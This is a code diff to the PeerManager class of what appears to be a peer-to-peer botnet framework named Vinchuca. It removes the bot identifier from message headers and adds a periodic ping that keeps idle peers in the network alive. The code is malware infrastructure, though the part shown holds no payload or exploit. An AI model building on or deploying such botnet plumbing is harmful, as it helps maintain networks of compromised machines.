@@ -5,6 +5,7 @@ using System.Net;
 using Vinchuca.Crypto;
 using Vinchuca.Network.Comunication;
 using Vinchuca.Network.Protocol.Messages;
+using Vinchuca.Network.Protocol.Messages.System;
 using Vinchuca.Utils;
 using Vinchuca.Workers;
 
@@ -12,25 +13,24 @@ namespace Vinchuca.Network.Protocol.Peers
 {
     public class PeerManager
     {
-        private readonly BotIdentifier _botId;
         private readonly IWorkScheduler _worker;
         private readonly CommunicationManager _communicationManager;
         internal readonly ReplyWaitManager WaitingForReply;
         private static readonly Log Logger = new Log(new TraceSource("Peer-Manager", SourceLevels.Verbose));
-
         public EventHandler<PackageReceivedEventArgs<BotHeader>> BotPackageReceivedEventArgs;
         private readonly PeerList _peerList;
+        internal Messages.IMessageSender MessageSender { get; set; }
 
-        public PeerManager(CommunicationManager communicationManager, PeerList peerList, IWorkScheduler worker, BotIdentifier botId)
+        public PeerManager(CommunicationManager communicationManager, PeerList peerList, IWorkScheduler worker)
         {
             _communicationManager = communicationManager;
             _communicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
             _worker = worker;
-            _botId = botId;
+            _peerList = peerList;
             WaitingForReply = new ReplyWaitManager(_communicationManager);
 
-            _worker.QueueForever(PurgeTimeouts, TimeSpan.FromSeconds(60));
-            _peerList = peerList;
+            _worker.QueueForever(Ping, TimeSpan.FromMinutes(5));
+            _worker.QueueForever(PurgeTimeouts, TimeSpan.FromMinutes(15));
 
             _peerList.BrokenBotDetected += BrokenBotDetected;
         }
@@ -106,7 +106,6 @@ namespace Vinchuca.Network.Protocol.Peers
                 header = new BotHeader
                 {
                     CorrelationId = correlationId == 0 ? RandomUtils.NextCorrelationId() : correlationId,
-                    BotId = _botId,
                     MessageId = (short)metadata.MessageId,
                     PayloadSize = (short) payload.Length,
                     Padding = (short) padding.Length,
@@ -138,6 +137,18 @@ namespace Vinchuca.Network.Protocol.Peers
             {
                 if (!peer.IsLazyBot && !peer.IsUnknownBot)
                     yield return peer.BotId;
+            }
+        }
+
+        private void Ping()
+        {
+            foreach (var peer in _peerList)
+            {
+                if (peer.Handshaked && !peer.IsUnknownBot && 
+                    peer.InactiveFor > TimeSpan.FromMinutes(10))
+                {
+                    MessageSender.Send(new PingMessage(), peer.BotId);
+                }
             }
         }
     }
